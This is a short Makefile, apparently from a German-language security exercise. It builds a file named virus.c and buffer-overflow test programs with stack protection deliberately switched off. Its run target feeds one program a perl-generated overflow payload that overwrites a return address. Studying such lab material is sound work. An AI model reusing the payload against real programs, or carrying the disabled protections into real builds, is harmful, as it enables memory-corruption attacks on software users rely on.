all:
	gcc aufgabe1a.c -o aufgabe1a.exe
	gcc aufgabe1b.c -o aufgabe1b.exe

	gcc virus.c -o virus.exe

#	gcc -Wall -pedantic bufover0.c -o bufover0.exe
	gcc -Wall -pedantic -fno-stack-protector bufover0.c -o bufover0.exe

	gcc -Wall -pedantic -fno-stack-protector bufover1.c -o bufover1.exe

run:
	./bufover1.exe `perl -e 'print "A" x 24 . "\x4e\x06\x40\x00"'`

clean:
	rm *.exe
